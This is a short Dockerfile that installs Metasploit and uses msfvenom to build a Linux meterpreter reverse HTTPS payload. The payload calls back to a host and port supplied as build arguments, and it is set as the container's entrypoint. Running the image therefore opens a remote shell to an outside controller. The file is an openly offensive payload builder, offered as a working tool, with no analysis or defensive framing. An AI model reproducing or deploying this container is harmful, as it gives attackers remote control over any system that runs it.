FROM debian:10.12-slim as build

LABEL maintainer v1sion

ARG HOST
ARG PORT

RUN apt-get update && apt-get install -y curl gnupg \
	&& curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall \
	&& chmod 755 msfinstall \
	&& ./msfinstall \
	&& rm ./msfinstall \
	&& rm -rf /var/lib/apt/lists/ \
	&& msfvenom -p linux/x64/meterpreter_reverse_https LHOST=${HOST} LPORT=${PORT} -f elf -o reverse.elf \
	&& chmod +x ./reverse.elf

FROM debian:10.12-slim
COPY --from=build /reverse.elf ./
ENTRYPOINT [ "./reverse.elf" ]